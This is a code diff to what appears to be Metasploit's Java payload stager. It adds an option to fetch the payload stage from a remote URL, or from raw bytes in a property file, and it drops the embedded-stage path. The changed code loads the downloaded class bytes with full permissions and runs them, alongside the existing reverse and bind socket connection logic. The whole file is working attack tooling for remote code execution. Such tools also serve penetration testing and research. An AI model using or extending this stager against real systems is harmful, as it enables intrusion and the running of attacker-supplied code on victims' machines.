@@ -33,6 +33,8 @@
  */
 package metasploit;
 
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.File;
 import java.io.FileNotFoundException;
@@ -165,6 +167,7 @@ public class Payload extends ClassLoader {
 			// check what stager to use (bind/reverse)
 			int lPort = Integer.parseInt(props.getProperty("LPORT", "4444"));
 			String lHost = props.getProperty("LHOST", null);
+			String url = props.getProperty("URL", null);
 			InputStream in;
 			OutputStream out;
 			if (lPort <= 0) { 
@@ -172,6 +175,13 @@ public class Payload extends ClassLoader {
 				// best used with embedded stages
 				in = System.in;
 				out = System.out;			
+			} else if (url != null) {
+				if (url.startsWith("raw:"))
+					// for debugging: just use raw bytes from property file
+					in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
+				else
+					in = new URL(url).openStream();
+				out = new ByteArrayOutputStream();
 			} else {
 				Socket socket;
 				if (lHost != null) {
@@ -193,7 +203,7 @@ public class Payload extends ClassLoader {
 			for (int i = 0; i < stageParams.length; i++) {
 				stageParams[i] = stageParamTokenizer.nextToken();
 			}
-			new Payload().bootstrap(in, out, props.getProperty("EmbeddedStage", null),stageParams);
+			new Payload().bootstrap(in, out, stageParams);
 		}
 	}
 
@@ -208,24 +218,20 @@ public class Payload extends ClassLoader {
 		fos.close();
 	}
 	
-	private final void bootstrap(InputStream rawIn, OutputStream out, String embeddedStageName, String[] stageParameters) throws Exception {
+	private final void bootstrap(InputStream rawIn, OutputStream out, String[] stageParameters) throws Exception {
 		try {
 			final DataInputStream in = new DataInputStream(rawIn);
 			Class clazz;
 			final Permissions permissions = new Permissions();
 			permissions.add(new AllPermission());
 			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
-			if (embeddedStageName == null) {
-				int length = in.readInt();
-				do {
-					final byte[] classfile = new byte[length];
-					in.readFully(classfile);
-					resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
-					length = in.readInt();
-				} while (length > 0);
-			} else {
-				clazz = Class.forName("javapayload.stage."+embeddedStageName);
-			}
+			int length = in.readInt();
+			do {
+				final byte[] classfile = new byte[length];
+				in.readFully(classfile);
+				resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
+				length = in.readInt();
+			} while (length > 0);
 			final Object stage = clazz.newInstance();
 			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, stageParameters });
 		} catch (final Throwable t) {
